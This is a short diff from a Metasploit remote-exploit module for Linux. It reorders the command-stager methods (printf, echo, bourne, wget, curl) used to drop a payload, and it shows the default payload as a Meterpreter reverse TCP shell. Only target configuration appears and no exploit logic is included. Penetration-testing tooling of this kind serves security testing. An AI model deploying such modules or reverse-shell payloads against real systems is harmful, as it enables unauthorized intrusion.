@@ -69,7 +69,7 @@ class MetasploitModule < Msf::Exploit::Remote
               'Platform' => 'linux',
               'Arch' => [ARCH_X64, ARCH_X86, ARCH_AARCH64],
               'Type' => :linux_dropper,
-              'CmdStagerFlavor' => ['wget', 'curl', 'printf', 'echo', 'bourne'],
+              'CmdStagerFlavor' => ['printf', 'echo', 'bourne', 'wget', 'curl'],
               'DefaultOptions' => {
                 'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'
               }
